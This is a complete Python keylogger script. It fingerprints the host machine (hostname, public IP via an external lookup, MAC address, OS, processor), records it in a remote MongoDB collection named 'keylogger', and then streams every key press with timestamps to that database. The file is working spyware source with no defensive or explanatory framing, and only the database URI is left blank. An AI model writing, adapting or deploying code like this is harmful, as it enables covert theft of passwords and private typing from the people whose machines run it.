import keyboard, socket, platform, uuid, requests
from random import randint
from datetime import datetime
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi

uri = ""
client = MongoClient(uri, server_api=ServerApi('1'))

id = ""
collection = client["keylogger"]["machines"]

tt = datetime.fromtimestamp(datetime.timestamp(datetime.now()))
system = {
    "_id" : (str(uuid.uuid4())+str(int(datetime.timestamp(datetime.now())))+str(randint(11111,99999))).replace('-',''),
    "timestamp" : f"{tt.hour}:{tt.minute}:{tt.second} - {tt.day}/{tt.month}/{tt.year}",
    "session" : 0,
    "info": {
            "name" : socket.gethostname(),
            "ip" : requests.get('https://api.ipify.org').text,
            "mac" : '-'.join(('%012X' % uuid.getnode())[i:i+2] for i in range(0, 12, 2)),
            "system" : platform.uname().system,
            "processor" : platform.uname().processor
    },"keys" : []
}

for x in collection.find({"info": system["info"]},{}):
    if system["info"] == x["info"]:
        id = x["_id"]
        break

if id == "":
    id = system["_id"]
    collection.insert_one(system)

session = collection.find_one({"_id": id})
collection.update_one({"_id": id}, {"$set": {"session" : session["session"]+1 }})

def log(event):
    global id; global data
    data = {"key": event.name, "session": session["session"]+1, "time": str(datetime.now())}
    collection.update_one({"_id": id}, {"$push": {"keys" : data}})

keyboard.on_press(log)
keyboard.wait()
